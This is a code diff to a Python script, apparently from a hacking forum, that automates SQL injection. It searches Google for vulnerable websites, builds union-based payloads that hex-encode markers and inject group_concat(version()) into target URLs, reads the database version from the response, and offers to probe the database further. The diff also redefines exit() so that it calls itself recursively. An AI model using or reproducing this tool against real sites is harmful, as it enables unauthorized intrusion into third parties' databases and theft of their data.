@@ -1,39 +1,30 @@
 #!/usr/bin/env python3.3
-import urllib.request , webbrowser , urllib , json , random
+import urllib.request , webbrowser , urllib , json , random , socket 
 
-print ("Welcome")
-
-def Exit():
+def exit():
 	print ("Goodbye :)")
 	exit(0)
 	
 def credit():
-	print ("Main Developer - leeman96\nScanner - RUii of HackForums\nUse how you see fit :)")
+	print ("***************************************")
+	print ("* Main Developer - leeman96\n* Scanner - RUii of HackForums\n* Use how you see fit :)")
+	print ("***************************************")
 	
 def version(connect, n):
 	screenScrapeFour = urllib.request.urlopen(connect)
 	screenScrapeFourText = screenScrapeFour.read()
 	screenScrapeFourText = str(screenScrapeFourText)
+	rr = 0
+	y = 0
 	for g in range(1, n+1):
 		n = "MB" + str(g)
 		if n in screenScrapeFourText:
-			mb = "".join("{:02x}".format(ord(c)) for c in n)
-			j = "0x" + mb
-			print (j)
-			start = "<mb>"
-			starte = "".join("{:02x}".format(ord(c)) for c in start)
-			starty = "0x" + starte
-			end = "</mb>"
-			ende = "".join("{:02x}".format(ord(c)) for c in end)
-			endy = "0x" + ende
-			version = "group_concat(" + starty + ",version()," + endy + ")"
-			connect = connect.replace(j, version)
-			webbrowser.open(connect)
-			"""screenScrapeFive = urllib.request.urlopen(connect)
-			screenScrapeFiveText = screenScrapeFive.read()
-			screenScrapeFiveText = str(screenScrapeFiveText)"""
+			if y >= 1:
+				info(connect,rr,n)
+			elif y == 0:
+				rr = g
+				y = y + 1
 			
-	
 def url(urls):
 	protocolOne = "http://"
 	protocolTwo = "https://"
@@ -95,8 +86,7 @@ def url(urls):
 			connect = connect + '--'
 			print(connect)
 			version(connect, n)
-			
-			
+					
 def scan():
 	print ("Scanning . . .")
 	count = 0
@@ -136,13 +126,38 @@ def scan():
 	except TypeError:
 		print ("Looks like Google hates you :)")
 	
+def info(url,l,tt):
+	mb = "".join("{:02x}".format(ord(c)) for c in tt)
+	j = "0x" + mb
+	start = "<" + tt + ">"
+	starte = "".join("{:02x}".format(ord(c)) for c in start)
+	starty = "0x" + starte
+	end = "</" + tt + ">"
+	ende = "".join("{:02x}".format(ord(c)) for c in end)
+	endy = "0x" + ende
+	version = "group_concat(" + starty + ",version()," + endy + ")"
+	url = url.replace(j, version)
+	webbrowser.open(url)
+	screenScrapeFive = urllib.request.urlopen(url)
+	screenScrapeFiveText = screenScrapeFive.read()
+	screenScrapeFiveText = str(screenScrapeFiveText)
+	if start in screenScrapeFiveText:
+		t = screenScrapeFiveText
+		info = t[t.find(start)+len(start):t.rfind(end)]
+		data = input("Do you want to probe the database? (y/n)")
+		if data in ["Y", "y"]:
+			print ("********************************************")
+			print ("* Host Name: ", url)
+			print ("* IP Address: ")
+
+print ("Welcome")
 dExit = True
 while dExit:
 	print ("\nScan - Scans Google for vulnerable websites\nUrl - Enter url to test\nCredit - For all who worked on this project\nExit - Exits applicaion")
 	choice = input("Enter Choice: ")
-	if choice == "Scan":
+	if choice in ['Scan', 'scan']:
 		scan()
-	elif choice == "Url":
+	elif choice in ["Url", "url"]:
 		c = input("Do you want to read from scanned file? y/n: ")
 		if c == "y":
 			filing = open("scan.txt" , "r")
@@ -155,11 +170,10 @@ while dExit:
 		else:
 			y = input("Enter url (without http://): ")
 			url(y)
-	elif choice == "Credit":
+	elif choice in ["Credit", "credit"]:
 		credit()
-	elif choice == "Exit":
+	elif choice in ["Exit", "exit"]:
 		dExit = False
-		Exit()
+		exit()
 	else:
 		print ("Unknown Command")
-
